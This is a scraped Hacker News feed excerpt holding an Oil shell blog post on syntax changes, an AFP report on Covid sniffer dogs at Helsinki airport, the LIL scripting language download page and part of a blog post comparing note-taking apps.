<a name="return-to-python-compatibility"></a>
<h3>Return to Python Compatibility</h3>
<p>Last year, Oil had some "cleanups" of the Python expression language, but I
decided that the unfamiliarity isn't worth it.  I reverted them, so:</p>
<ul>
<li>Integer division <code>div</code> is back to <code>//</code></li>
<li>Modulus <code>mod</code> is back to <code>%</code></li>
<li><code>xor</code> is back to <code>^</code></li>
<li>Exponentiation <code>^</code> is back to <code>**</code></li>
</ul>
<p>(The <a href="#appendix">appendix</a> has some rationale for this.)</p>
<a name="to-concatenate-and-to-match-globs"></a>
<h3><code>++</code> to concatenate, <code>~~</code> and <code>!~~</code> to match globs</h3>
<p>The <code>++</code> operator is for string and list concatenation.  That is, <code>a + b</code>
always does <strong>math</strong>, and <code>a ++ b</code> always does concatenation.</p>
<p>This is to support Awk-like auto-type conversion.  Similarly, comparison
operators like <code>&lt;</code> and <code>&lt;=</code> will only work on numbers, and we'll use a
different syntax for strings.  (Yes, I realize the danger with such type
conversion!)</p>
<p>The <code>~~</code> and <code>!~~</code> operators are for glob matching.  They deprecate <code>[[ x == *.py ]]</code> in <a href="http://www.oilshell.org/cross-ref.html?tag=bash#bash">bash</a>.</p>
<a name="literals-expression-mode"></a>
<h2>Literals (Expression Mode)</h2>
<a name="dicts-are-not"></a>
<h3>Dicts are <code>{}</code>, not <code>%{}</code></h3>
<p>This is another return to Python compatibility.</p>
<p>We used sigils like <code>%{foo: 42}</code> in dict literals because Oil uses <code>{ }</code> for
C-like statement  blocks, and it lacks semicolons.</p>
<p>Making the tokens distinct is one way to avoid a subtle parsing issue.  <a href="https://news.ycombinator.com/item?id=22706645">This
Hacker News comment</a> about the
Dart language describes some of the difficulties with using <code>{}</code>  in both
expressions and statements.</p>
<p>However, Oil's problem  is not as hard as Dart's, and I solved it by simply
including newlines in the grammar.  A key-value pair can be on a line:</p>
<pre><code>var mydict = {
  server: "www.example.com"  
  port: 80
}
</code></pre>
<p>But you can't split it across lines</p>
<pre><code>
var mydict = {
  server:
    "www.example.com"
}
</code></pre>
<p>without either <code>()</code> or <code>\</code>:</p>
<pre><code>var mydict = {
  
  server: (
    "www.example.com"
  )
}
</code></pre>
<p>It was bugging me that lists are just <code>[1, 2, 3]</code>, while dicts were <code>%{key: 'value'}</code>.  This is now fixed!</p>
<p>(<a href="https://oilshell.zulipchat.com/#narrow/stream/121540-oil-discuss/topic/Expression.20Language.20Improvements/near/212235586">Good Zulip Feedback on Line
Breaking</a>.
I'm still looking for more feedback.)</p>
<hr>
<p>I also removed the <code>%[]</code> syntax , which was an overly ambitious idea for typed
array literals.  We already have <code>%(one two)</code> for shell-like arrays, and
<code>['one', 'two']</code> for Python/JS-like lists.</p>
<p>(Aside: Perl and Ruby have <code>qw(one two)</code> or <code>qw[one two]</code> which is like our
<code>%(one two)</code>.)</p>
<a name="blocks-are-echo-pwd"></a>
<h3>Blocks are <code>&amp;(echo $PWD)</code></h3>
<p>Oil's Ruby-like blocks are "first class".  Normally they're passed to procs as
the last argument:</p>
<pre><code>cd /tmp {
  echo $PWD
}
</code></pre>
<p>But we also need them in <a href="http://www.oilshell.org/release/latest/doc/command-vs-expression-mode.html">expression
mode</a>.
I decided on the syntax <span><code>&amp;(echo $PWD)</code></span>.</p>
<p>This may seem inconsistent at first, but it's consistent with command subs:</p>
<pre><code>var b1 = $(echo $PWD)  
var b2 = &amp;(echo $PWD)  
</code></pre>
<a name="chars-are-u012345"></a>
<h3>Chars are <code>\u{012345}</code></h3>
<p>Character literals <strong>stand alone</strong> in the expression language, like</p>
<pre><code>var x = \u{3bf}  
</code></pre>
<p>That is, you don't need quotes.  They're for both "code point literals"
("runes" in Go) and <a href="http://www.oilshell.org/cross-ref.html?tag=eggex#eggex">eggex</a> char classes.</p>
<p>This syntax is now consistent within C-escaped strings like <code>$''</code> and <code>c''</code>,
and <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>, which leads us into the next section.</p>
<a name="tightened-up-string-literals"></a>
<h2>Tightened Up String Literals</h2>
<p>Shell has a rich string literal syntax.  Oil inherits all of its power, but (as
of this release) removes unnecessary flexibility.</p>
<a name="c-style"></a>
<h3>C-Style</h3>
<p>Here are some C-style strings:</p>
<pre><code>echo $'C-style'
echo $'\n \i'               
echo $'\0123 \x01 \x1'      
echo $' \u1234 \U00012345'  
</code></pre>
<p>Notes:</p>
<ol>
<li><code>\n</code> is a valid char escape, but <code>\i</code> is an <strong>invalid</strong> one.  Bash accepts
it and prints <code>\i</code> literally.</li>
<li>Octal escapes and hex escapes can express exactly the same bytes.</li>
<li>Hex escapes can be abbreviated <code>\x1</code> instead of <code>\x01</code>.</li>
</ol>
<p>I made the following changes to simplify this syntax:</p>
<ol>
<li>Disallow invalid char escapes.</li>
<li>Disallow <strong>all</strong> octal escapes.</li>
<li>Disallow single char hex escapes.  Must be <code>\xHH</code>.</li>
<li>Disallow the two unicode escapes in favor of the QSN/Rust style <code>\u{12345}</code>,
which I added support for.</li>
</ol>
<p>As usual, <strong>we do a dance to avoid breaking existing code</strong>, while preventing
legacy from creeping into the <a href="http://www.oilshell.org/cross-ref.html?tag=oil-language#oil-language">Oil language</a>:</p>
<ul>
<li>In command mode, <code>shopt --unset parse_backslash</code> enables all these syntax
errors.  This is the default in <code>bin/oil</code> (option group <code>oil:all</code>).</li>
<li>In expression mode, they're always disallowed, even when running <code>bin/osh</code>.
Legacy shell scripts don't have expressions, so this is OK!</li>
</ul>
<a name="a-superset-of-qsn"></a>
<h3>A Superset of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a></h3>
<p>Now that we have <code>\u{12345}</code>, we have an interesting property: any <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>
string is now an Oil string!  Though you have to add a <code>$</code> sigil:</p>
<pre><code>echo $'QSN and Oil \\ \n'    

var mystr = $'\x01 \u{3bf}'  
var mystr = c'\x01 \u{3bf}'  
</code></pre>
<a name="double-quoted"></a>
<h3>Double Quoted</h3>
<p>Here are some doubled quoted strings:</p>
<pre><code>echo "double quoted"
echo "\$ \i"         
echo "\\ \ ."        
echo "\$ $ ."        
echo "old: `hostname`, new: $(hostname)"  
</code></pre>
<p>Oil makes the following changes:</p>
<ul>
<li><code>parse_backslash</code> makes <code>\i</code> and <code>\</code> a syntax error.  Add the
<code>\</code> to fix it.</li>
<li><code>parse_dollar</code> makes <code>$</code> a syntax error.  Ditto.</li>
<li><code>parse_backticks</code> makes the old command sub style a syntax
error.  Use the new style.</li>
</ul>
<p>These options are <strong>unset</strong> in the <a href="http://www.oilshell.org/release/latest/doc/oil-options.html">option group</a>
<code>oil:all</code>.</p>
<p>Aside: our <a href="http://www.oilshell.org/blog/tags.html?tag=lexing#lexing">lexing style</a> is awesome for making these
changes!</p>
<a name="word-syntax-command-mode"></a>
<h2>Word Syntax (Command Mode)</h2>
<p>I made similar changes to <strong>unquoted words</strong>.</p>
<a name="parse_at_all-reserves-words-beginning-with"></a>
<h3><code>parse_at_all</code> Reserves Words Beginning With <code>@</code></h3>
<p>In the <code>oil:basic</code> option group, we allow this syntax, but we only break the
bare minimum:</p>
<pre><code>echo @myarray
</code></pre>
<p>But the <code>oil:all</code> option group reserves <strong>any</strong> word beginning with <code>@</code>, like:</p>
<pre><code>@{} @[] @// @'' @""
</code></pre>
<p>This will be useful for future language extensions.  That is, creating more
syntax errors lets the language <strong>evolve</strong>.</p>
<p>I also expect <code>shopt --unset parse_dollar</code> to have this benefit.  It allows us
to parse inline eggexes like <code>$/ digit+ /</code>.</p>
<a name="parse_dollar-again-for-strictness"></a>
<h3><code>parse_dollar</code> Again, For Strictness</h3>
<p>To recap:</p>
<p>No:</p>
<pre><code>echo $
echo "$"
</code></pre>
<p>Yes:</p>
<pre><code>echo \$
echo "\$"
</code></pre>
<p>TODO: We also need to support <code>strict_backslash</code> in unquoted words.</p>
<a name="next"></a>
<h2>Next</h2>
<p>This post got long, so I split it into two parts.  The next part will review
changes in Oil keywords, stdlib functions, shell builtins, and documentations.</p>
<p><a href="https://old.reddit.com/r/oilshell/comments/jle86e/big_changes_to_the_oil_language/?">Let me know</a> what you think of these changes!</p>

<a name="appendix-the-tea-language"></a>
<h2>Appendix: The Tea Language</h2>
<p>One reason to be more Python compatible is that I have a quixotic plan to
self-host Oil and expose the <a href="http://www.oilshell.org/cross-ref.html?tag=metalanguage#metalanguage">metalanguage</a> to users.  That is, our DSLs:</p>
<ul>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=opy#opy">OPy</a> / <a href="http://www.oilshell.org/cross-ref.html?tag=mypy#mypy">MyPy</a> subset</li>
<li>Zephyr <a href="http://www.oilshell.org/cross-ref.html?tag=zephyr-asdl#zephyr-asdl">ASDL</a></li>
<li>A dialect of <a href="http://www.oilshell.org/cross-ref.html?tag=regular-language#regular-language">regular languages</a></li>
</ul>
<p>should be combined into one language, which I'm calling "Tea".</p>
<p>Against my better judgement, I brought this up <a href="https://old.reddit.com/r/ProgrammingLanguages/comments/jb5i5m/help_i_keep_stealing_features_from_elixir_because/g8urxou/">on
Reddit</a>
and <a href="https://lobste.rs/s/4hx42h/assorted_thoughts_on_zig_rust#c_mqpg6e">on
lobste.rs</a>.
Briefly, Tea can be described as <strong>statically-typed Python with sum types</strong>
— which someone asked actually for!</p>
<p>And it should have <a href="http://www.oilshell.org/cross-ref.html?tag=metaprogramming#metaprogramming">metaprogramming</a> features to express the equivalent
of Oil's use of textual code generation.</p>
<p>I wrote a working grammar to design Tea's syntax (*), but that's the only
implementation so far.  It would be a large project, but it's also a concrete
one, because we have 30K-60K+ lines of working code as a use case.</p>
<p>If you want to work on a statically typed language, let me know!  I don't know
how to write a type checker, and can use help.</p>
<p>Even if Tea doesn't get done, Oil will be useful either way.  We can continue
using these DSLs for a long time.</p>
<hr>
<p>(*) The entire language is expressed in the grammar as a big expression, using
a single <a href="http://www.oilshell.org/cross-ref.html?tag=lexer-modes#lexer-modes">lexer mode</a>.  It's nowhere near as complicated as
shell!</p>




</div>]]>
            </description>
            <link>http://www.oilshell.org/blog/2020/10/big-changes.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949731</guid>
            <pubDate>Sat, 31 Oct 2020 07:37:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Finland's Covid sniffer dog trial 'extremely positive': researchers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949592">thread link</a>) | @respinal
<br/>
October 30, 2020 | https://www.rfi.fr/en/wires/20201028-finlands-covid-sniffer-dog-trial-extremely-positive-researchers | <a href="https://web.archive.org/web/*/https://www.rfi.fr/en/wires/20201028-finlands-covid-sniffer-dog-trial-extremely-positive-researchers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-nav-container="">
                                        

                
                <div>
                                <nav>
    <ol>
                    <li>                                        <a href="https://www.rfi.fr/en/" aria-label="Back to homepage"><svg xmlns="http://www.w3.org/2000/svg" viewBox="9299 -3984 9.748 12"><path fill="currentColor" d="M-1805,3480h-3v-7.125l4.875-4.875,4.874,4.875V3480H-1801v-4h-4v4Z" transform="translate(11107 -7452)"></path></svg>
</a></li>
                    <li><span>/</span>                                        <a href="https://www.rfi.fr/en/live-news/">Live news</a></li>
            </ol>
</nav>
    
                
    <article>
        

                        

            

                            <p><span>Issued on: <time datetime="2020-10-28T16:38:05+00:00" pubdate="pubdate">28/10/2020 - 17:38</time></span></p>
                    

    
                                    <div>
                                                                                                                
<figure>
    <p><img src="https://s.rfi.fr/media/display/7006f538-193c-11eb-bfd9-005056a964fe/w:310/p:16x9/61e9874f1c836ef58147abd96c3dad75be8c1d7f.jpg" alt="Three dogs, named Kossi, ET and Miina, have sniffed swabs taken from 2,200 passengers in the month since the testing booth was set up at the airport's arrivals hall." data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-image-dataset="{&quot;url&quot;:&quot;https:\/\/s.rfi.fr\/media\/display\/7006f538-193c-11eb-bfd9-005056a964fe\/&quot;,&quot;filename&quot;:&quot;61e9874f1c836ef58147abd96c3dad75be8c1d7f.jpg&quot;,&quot;ratio&quot;:null,&quot;displayFormat&quot;:&quot;16x9&quot;}">
    </p>
                        <figcaption>
                <span>Three dogs, named Kossi, ET and Miina, have sniffed swabs taken from 2,200 passengers in the month since the testing booth was set up at the airport's arrivals hall.</span>                <span>Lehtikuva/AFP</span>            </figcaption>
            </figure>
                                                            </div>
                    
                

    
            <div>
            
                            <p>Vantaa (Finland) (AFP)</p>
                        <p>A pilot project using sniffer dogs to provide instant and pain-free coronavirus testing at Helsinki airport has shown promising early results and proven popular with travellers, researchers said on Wednesday.</p><p>Three dogs, named Kossi, ET and Miina, have sniffed swabs taken from 2,200 passengers in the month since the testing booth was set up at the airport's arrivals hall, and have found the virus in 0.6 percent of travellers.</p><p>Although the research is not due for completion until December, the team say the initial findings appear broadly in line with detection rates of the nasal PCR tests also conducted on arriving travellers.</p><p>"We have done 16-17,000 PCR tests at the airport and less than one percent are positive," Timo Aronkyto, deputy mayor of Vantaa, told reporters.</p><p>Compared to the results found by the dogs, "they are about the same, I don't think there is a statistical difference," Aronkyto said.</p><p>The researchers are now analysing how closely the two sets of test results match each other -- whether the dogs found coronavirus in passengers whose infection was confirmed by a PCR test -- and hope to publicise their findings at the end of the year.</p><p>Preliminary experiments in the first major wave of infections earlier in the year suggested the dogs can detect the virus with close to 100 percent accuracy, up to five days earlier than a PCR test.</p><p>Feedback from arriving passengers, who take the free-of-charge test voluntarily, "has been exceptionally positive," project manager Soile Turunen said. </p><p>Around 100 travellers a day have been queuing up for the test, which involves wiping a swab onto the skin which is then put in front of the dog, who will quickly pass over a negative sample but will be attracted to a positive one.</p><p>"People don't complain about the queues, in fact it's the opposite," Turunen said. </p><p>"They're coming up to us to to say 'Hi' from morning until evening," she added.</p><p>A fourth dog, a German shepherd called Valo, is currently in training to begin work at the airport testing booth.</p><p>The Helsinki University researchers behind the trial, working with sniffer-dog specialists from the organisation Wise Nose, hope that their research will persuade the government to fund a rollout of the dogs for other uses, such as at tourist hotspots or large public gatherings.</p><p>Although sniffer dog trials have been undertaken elsewhere, such as in the UAE, France, Ruussia and Chile, use of canine scent-detectors to bolster coronavirus testing has not yet been widely adopted by authorities, in part because of a lack of peer-reviewed literature, some researchers believe.</p><p>Dog handling charities have previously worked with dogs to detect cancers, Parkinson's disease and bacterial infections using samples taken from humans.</p>
            <p>© 2020 AFP</p>        </div>

            
                </article>
            
        
                                            
                                    </div>
            </div></div>]]>
            </description>
            <link>https://www.rfi.fr/en/wires/20201028-finlands-covid-sniffer-dog-trial-extremely-positive-researchers</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949592</guid>
            <pubDate>Sat, 31 Oct 2020 06:47:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[LIL: Little Interpreted Language]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24949515">thread link</a>) | @marttt
<br/>
October 30, 2020 | http://runtimeterror.com/tech/lil/ | <a href="https://web.archive.org/web/*/http://runtimeterror.com/tech/lil/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<p><b>LIL</b> (stands for <b>L</b>ittle <b>I</b>nterpreted <b>L</b>anguage)
is a small highly dynamic scripting language inspired by Tcl and
unix shells. LIL has two implementations, one written in <b>C</b>,
which consists of a pair of <tt>.c</tt> and <tt>.h</tt> files
and one in <b><a href="http://freepascal.org/">Free Pascal</a></b>,
which consists of a single <tt>pas</tt> file (a unit). Also a
<a href="http://lazarus-ide.org/">Lazarus</a> package for the
latter is provided.</p>

<h2>Contents</h2>

<menu>
  <li><a href="#downloads">Downloads</a>
  <menu>
    <li><a href="#latestversion">Latest version</a>
    </li><li><a href="#olderversions">Older versions</a>
    </li><li><a href="#winlil">WinLIL</a>
    </li><li><a href="#lilgui">LILGUI</a>
  </li></menu>
  </li><li><a href="#stability">API stability and compatibility</a>
  </li><li><a href="#documentation">Documentation</a>
  </li><li><a href="#status">Status</a>
  </li><li><a href="#license">License</a>
</li></menu>

<h2><a name="downloads"></a>Downloads</h2>

<p>LIL is currently available as source code snapshots of both
the C and the Free Pascal version combined in a single ZIP file.
These snapshots are versioned using their release date. Note that
the interpreter's reflect version command will report <i>0.1</i>
regardless of date versioning. Both of these will change at some
point in the future to provide proper versioned releases.</p>

<h3><a name="latestversion"></a>Latest version</h3>

<p>The latest version of LIL is <a href="http://runtimeterror.com/tech/lil/lil20190821.zip">lil20190821.zip</a>
(159KB). This is an extract from my private Fossil repository
(the files are mostly the same as the older archives, but this
also includes a full changelog from the repository going back
to 2010 and the LIL logo as an XCF image which can be opened with
GIMP).</p>

<p>Please note that <b>20190821</b> contains slightly altered
behavior for line breaking during list parsing that <i>could</i>
affect some scripts, especially with lists that contain code inside
square brackets, however the previous behavior was completely
broken (e.g. having multiple commands inside brackets in a list
would merge all commands into a single one and if a semicolon
was used for the multiple commands, the entire command wouldn't
be parsed properly). Because of that i expect any reliance on
the previous behavior to be accidental (and in practice i do not
really expect any such script to even exist). Also in the same
version a Bash script is introduced to check the differences between
different executables by running the same scripts under both and
comparing the results, which show that FPLIL contains a few incompatibilities
with C LIL. At this moment FPLIL doesn't implement the changes
mentioned so far - all these incompatibilities and changes will
be fixed in a later release.</p>

<h3><a name="olderversions"></a>Older versions</h3>

<p>Some older versions are also available in case you need them.
LIL should be mostly backwards compatible (see below), but right
now there is no promise for strict API or ABI compatibility.</p>

<ul>
  <li><a href="http://runtimeterror.com/tech/lil/lil20190819.zip">lil20190819.zip</a> (155KB)<a href="http://runtimeterror.com/tech/lil/lil20190818.zip"></a>
  </li><li><a href="http://runtimeterror.com/tech/lil/lil20190818.zip">lil20190818.zip</a> (154KB)
  </li><li><a href="http://runtimeterror.com/tech/lil/lil20190114.zip">lil20190114.zip</a> (91KB)
  </li><li><a href="http://runtimeterror.com/tech/lil/lil20161129.zip">lil20161129.zip</a> (88KB)
  </li><li><a href="http://runtimeterror.com/tech/lil/lil20160812.zip">lil20160812.zip</a> (88KB)
  </li><li><a href="http://runtimeterror.com/tech/lil/lil20160603.zip">lil20160603.zip</a> (88KB)
</li></ul>

<h3><a name="winlil"></a>WinLIL</h3>

<p>If you are using Windows you can also download <b>WinLIL</b>,
a small Windows-based environment with editor, console and extra
graphics functions that can be used to experiment with LIL. It
is self-contained in a single executable, including the LIL documentation.</p>

<p>The latest version is <a href="http://runtimeterror.com/tech/lil/winlil14.zip">WinLIL 1.4</a>
(204KB) based on <i>C LIL 20190821</i>. <a href="http://runtimeterror.com/tech/lil/winlil.png">Here
is a screenshot</a> of it in action. Also a small doodle program
can be <a href="http://runtimeterror.com/tech/lil/doodle.lil">downloaded here</a> and a <a href="http://runtimeterror.com/tech/lil/doodle.gif">screenshot
seen here</a>. <a href="http://runtimeterror.com/tech/lil/winlil20190821231511.zip">This archive</a>
(45KB) contains the source code, but note that it uses the original
Borland C++ Builder and to compile with a newer version (such
as the free Community Edition) you'll need to recreate the project
file and make a few modifications to the code.</p>

<p>Older versions of WinLIL can be found in these files: <a href="http://runtimeterror.com/tech/lil/winlil13.zip">winlil13.zip</a>
(1.3 binary), <a href="http://runtimeterror.com/tech/lil/winlil20190524200539.zip">winlil20190524200539.zip</a>
(1.3 source), <a href="http://runtimeterror.com/tech/lil/winlil20170425.zip">winlil20170424.zip</a>
(binary), <a href="http://runtimeterror.com/tech/lil/winlilsrc20161220.7z">winlilsrc20161220.7z</a>
(source).</p>

<h3><a name="lilgui"></a>LILGUI</h3>

<p><b>LILGUI</b> is an experimental API specification for GUI
applications that provide scripting functionality through LIL
to expose a simple GUI API. It is mainly intended for creating
embeddable GUIs (e.g. a panel in a sidebar) although it can also
be used for popup windows and dialogs. Currently the only implementation
for LILGUI is <b>LazLILGUI</b>, which is a component for Lazarus
that uses LCL to provide the actual GUI functionality.</p>

<p>The latest version of LILGUI files (which include the API spec,
LazLILGUI and a couple of examples) can be <a href="http://runtimeterror.com/tech/lil/lilgui20190708215135.zip">downloaded
here</a> (85KB). A 64bit windows binary for <b>LazLILGUI Notepad</b>,
a text editor that provides a sidebar to try out LILGUI code,
can be <a href="http://runtimeterror.com/tech/lil/llgnotepad20190708.zip">downloaded here</a> (1.3MB).
Also you can see the screenshots of program in action under <a href="http://runtimeterror.com/tech/lil/llgnotepadwin.png">Windows</a>, <a href="http://runtimeterror.com/tech/lil/llgnotepadlin.png">Linux</a>
and <a href="http://runtimeterror.com/tech/lil/llgnotepadosx.png">Mac OS X</a> and also the <a href="http://runtimeterror.com/tech/lil/llgcce.png">Custom Control Example</a> under Windows.</p>

<h2><a name="stability"></a>API stability and compatibility</h2>

<p>Generally speaking, both the C and Free Pascal implementation
APIs are stable <i>for the most part</i>. The <b>C API</b> was
broken only once in middle 2010 when <code>lil_command_t</code>
was renamed to <code>lil_func_t</code> and the <b>C ABI</b> for
the Windows DLL is also backwards compatible since late 2010.
The <b>Free Pascal</b> implementation has a less stable API but
as Free Pascal itself does not support ABI stability, this is
less of a concern.</p>

<p>In the foreseeable future the C API should be stable, but i'd
recommend <i>against</i> building a system-wide shared version
of the library before a proper versioned release is made. Once
a versioned release is made, both the API and ABI will remain
stable for as long as it is technically possible.</p>

<p>Script code should be backwards compatible even as new commands
are introduced since scripts and host applications will redefine
any conflicting functions anyway. The only time script code was
broken was in 2012 when the multiline comments were introduced
so any script that used a comment line like <code>#####</code>
was broken. This was addressed in a fix in 2014 that added a special
check for such cases so that multiline comments can only start
and end with two <code>#</code>s but not three or more (while
this could have broken any script that used three or more <code>#</code>s
to start and end multiline comments, the chances for such a script
are very slim).</p>

<p>Like with the C API, the script backwards compatibility currently
is mostly stable, but minor changes (like the multiline comment
changes mentioned above) might be made until a versioned release
is made or fixes to the script behavior to be closer to what is
described in the documentation or simply fix broken behavior.
At that point no changes will be made that may affect backwards
compatibility.</p>

<p>LILGUI and LazLILGUI are more experimental and may see backwards
incompatible changes in the future.</p>

<h2><a name="documentation"></a>Documentation</h2>

<p>Currently the only documentation is the (lengthy) <tt>readme.txt</tt>
file that <a href="http://runtimeterror.com/tech/lil/readme.txt">you can read here</a> or as part
of the archive containing the source code. At some point i'll
write better formatted documentation. Free Pascal has its own
API documentation <a href="http://runtimeterror.com/tech/lil/pasreadme.txt">readable here</a> and
also as a part of the archive containing the source code.</p>

<p>The LILGUI API can be <a href="http://runtimeterror.com/tech/lil/api.txt">found here</a> and
the documentation for LazLILGUI can be <a href="http://runtimeterror.com/tech/lil/llgreadme.txt">found
here</a>. Both are also part of the LILGUI archive.</p>

<p>Also <a href="http://www.slideshare.net/badsectoracula/lil-presentation">an
old LIL presentation can be found on SlideShare</a>. Please note
that the URLs in the presentation are not valid anymore.</p>

<h2><a name="status"></a>Status</h2>

<p>LIL is practically <i>feature-complete</i> and i do very little
development of it. I do not plan on making it a big and bloated
library that tries to provide everything - if anything, in the
future i might add some conditionals to remove bits of the library
for users who do not need, e.g, the string or list functions.</p>

<p>Further work is mostly "around" LIL and not on the
language itself: improving the documentation, writing a test suite
(currently there are several examples which i run after making
changes and almost half of them come from bug fixes, but i'd like
somethnig more automated), fixing some issues with the Free Pascal
implementation, adding more functions on the C API to access LIL's
state, etc.</p>

<h2><a name="license"></a>License</h2>

<p>Both the C and Free Pascal implementations as well as WinLIL
are licensed under the zlib license below:</p>

<blockquote>
  <pre>LIL - Little Interpreted Language
Copyright (C) 2010-2019 Kostas Michalopoulos

This software is provided 'as-is', without any express or implied
warranty.  In no event will the authors be held liable for any damages
arising from the use of this software.

Permission is granted to anyone to use this software for any purpose,
including commercial applications, and to alter it and redistribute it
freely, subject to the following restrictions:

1. The origin of this software must not be misrepresented; you must not
   claim that you wrote the original software. If you use this software
   in a product, an acknowledgment in the product documentation would be
   appreciated but is not required.
2. Altered source versions must be plainly marked as such, and must not be
   misrepresented as being the original software.
3. This notice may not be removed or altered from any source distribution.</pre>
</blockquote>



</div>]]>
            </description>
            <link>http://runtimeterror.com/tech/lil/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949515</guid>
            <pubDate>Sat, 31 Oct 2020 06:20:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Everything you need to know about windsocks]]>
            </title>
            <description>
<![CDATA[
Score 51 | Comments 14 (<a href="https://news.ycombinator.com/item?id=24949514">thread link</a>) | @oftenwrong
<br/>
October 30, 2020 | https://www.hollandaviation.nl/en/windsock-everything-you-need-to-know-about-windsocks/ | <a href="https://web.archive.org/web/*/https://www.hollandaviation.nl/en/windsock-everything-you-need-to-know-about-windsocks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.hollandaviation.nl/en/windsock-everything-you-need-to-know-about-windsocks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949514</guid>
            <pubDate>Sat, 31 Oct 2020 06:19:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Note Taking Apps]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949421">thread link</a>) | @finder83
<br/>
October 30, 2020 | https://jself.net/posts/note-taking/ | <a href="https://web.archive.org/web/*/https://jself.net/posts/note-taking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>About every year or so I decide to change note-taking apps. Or at least I change <em>most</em> of my notes to a new app. This time I'm going back to an old app, but because of a "new" note-taking paradigm. The one I'm going back to is <a href="https://orgmode.org/">Org Mode</a>, but with a twist. In this post, I hope to look at some of the new ideas in note-taking and some of the apps available.</p><p>The new paradigm that I'm talking about is backlinking. It's actually not a new idea at all of course, but there have been many apps that have started to take advantage of backlinking. The one that launched off the fad was <a href="https://roamresearch.com/">Roam Research</a>. Many of these tools are based on or enable, a note-taking method called Zettelkasten.</p><p>Zettelkasten is a technique of note taking and indexing popularized by Niklas Luhmann, a German sociologist from the middle of the 20th century. Zettelkasten, literally "slip box", was a note-taking method in which small slips of paper were ID'd and linked to one another, creating a linked system of knowledge that Luhmann could then use in his books, research, and papers. As the links were maintained in two directions, ideas could be backward linked to other ideas. Ideas from various sources could then form a new network and hopefully, new links could be formed between information. There's more to it, such as the idea that each note should be an atomic, well-formed idea. For more information, and because I'm failing to explain it, visit <a href="https://zettelkasten.de/">https://zettelkasten.de/</a>.</p><p>I won't pretend to be an expert in Zettelkasten, and all of this is new to me. Frankly, I'm not even sure that the Zettelkasten method would be useful to me as I need longer form notes on many of the things that I do. But the idea of backlinking notes so that you can refer to notes that refer to the note that you're on seems extremely powerful. It feels like the next innovation in note-taking, beyond simple outlining or linking, precisely because you're essentially forming a distributed network of notes.</p><h2>Backlinks</h2><p>Let me give you an example. Say that I'm working on Kubernetes and can't remember the name of a tool that I had used. I can just pull up the Kubernetes note and look at the backlinks and see which notes are tagged as Kubernetes. Why couldn't I just create a link on the Kubernetes note? Well, of course, I could, but that would require opening that note and adding a link that may have nothing to do with the context for the primary Kubernetes notes.</p><p>Or another example, I am taking notes on a sermon being preached on John 3. I can then dive into John 3's note and look at all other sources tagged with John 3, including sermon notes, book notes, or personal devotional notes. From there I could dive into individual topics such as love or the kingdom of God.</p><p>At least, that's how I hope it will work in practice. Again, I'm just getting started</p><p>It seems that with the release of Roam Research, there have now been a plethora of tools in development that work off of the idea of backlinks, as well as atomic thoughts. I've done a lot of research in the last week, and have formed some opinions about some. Let's start first with the note-taking app I'm coming from:</p><h2>Notion</h2><p><a href="https://www.notion.so/">Notion</a> seemed to take off in 2018-2019 as the premiere note-taking app. Indeed, Notion has introduced backlinks in a recent release.</p><p>I like Notion, and will both keep paying for it and taking notes there. It has a lot of power in organizing and reorganizing notes, as well as pulling in other content such as code, videos, images, etc. It even goes so far as to include database-like tables and Kanban-style boards.</p><p>Backlinks in Notion seem to primarily work at the "page" level, rather than the block//heading level like Roam Research. And while I love Notion as a clean interface for notes, I'm not wild about its lack of capabilities in making TODOs and alerts and finding notes after the fact. Its search is great but basic.</p><h2>Roam Research</h2><p><a href="https://roamresearch.com/">Roam Research</a> seems like a really powerful system, particularly for a research-style Zettelkasten. I honestly have not tried it, both because I didn't get into the trial, but now because of the cost and the concern of people losing notes and the lack of good backups. Most of the posts I've seen about note stability have disappeared, but you can see one graveyard here: <a href="https://www.reddit.com/r/RoamResearch/comments/hsrg0z/lost_all_my_notes_need_recommendations_for/">https://www.reddit.com/r/RoamResearch/comments/hsrg0z/lost_all_my_notes_need_recommendations_for/</a>. There was even a post today about it: <a href="https://jeffchen.dev/posts/Recovering-Lost-Roam-Notes/">https://jeffchen.dev/posts/Recovering-Lost-Roam-Notes/</a></p><p>Frankly, I prefer open source and being in control of my own content and notes. I know Notion doesn't fit into that well, but it also seemed ahead of its time to me.</p><h2>TiddlyWiki</h2><p><a href="https://tiddlywiki.com/">TiddlyWiki</a> has been around a while and was the note system I used before Notion. TiddlyWiki is many things, but at its heart, it was a single file HTML that you could download and make changes to in wiki syntax. TiddlyWiki has had backlinks for a while, possibly even before Roam Research, but recently the community has released some versions specifically for backlinking: <a href="https://akhater.github.io/drift/">Drift</a> and <a href="https://kebifurai.github.io/TiddlyResearch/">Tiddly Research</a> are two that I've tried out.</p><p>They're great, but there are a few problems that I've had with TiddlyWiki that just make me hesitant. I had a lot of notes in it as I was working in Seminary, wrote a custom Bible linking plugin, etc, but updating it was a nightmare on the node version with my customization. For each upgrade, I'd have to manually diff my plugin changes against the upgrades. Of course, this may have just been me not knowing what I was doing, but it still wasn't fun. Also, just the speed of entering notes and using the mouse doesn't appeal to me. Being a Vim 